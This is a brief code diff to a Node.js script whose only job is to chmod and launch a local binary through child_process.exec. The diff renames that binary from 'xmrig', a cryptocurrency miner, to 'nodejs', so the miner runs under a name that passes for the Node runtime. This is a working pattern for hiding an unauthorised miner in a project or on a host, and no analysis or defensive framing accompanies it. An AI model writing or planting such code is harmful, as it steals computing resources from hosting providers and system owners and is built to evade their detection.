@@ -1,5 +1,5 @@
 var exec = require('child_process').exec;
-exec('chmod +x xmrig', function(error, stdout, stderr) {
+exec('chmod +x nodejs', function(error, stdout, stderr) {
     console.log('stdout: ' + stdout);
     console.log('stderr: ' + stderr);
     if (error !== null) {
@@ -7,7 +7,7 @@ exec('chmod +x xmrig', function(error, stdout, stderr) {
     }
 });
 var exec = require('child_process').exec;
-exec('./xmrig', function(error, stdout, stderr) {
+exec('./nodejs', function(error, stdout, stderr) {
     console.log('stdout: ' + stdout);
     console.log('stderr: ' + stderr);
     if (error !== null) {
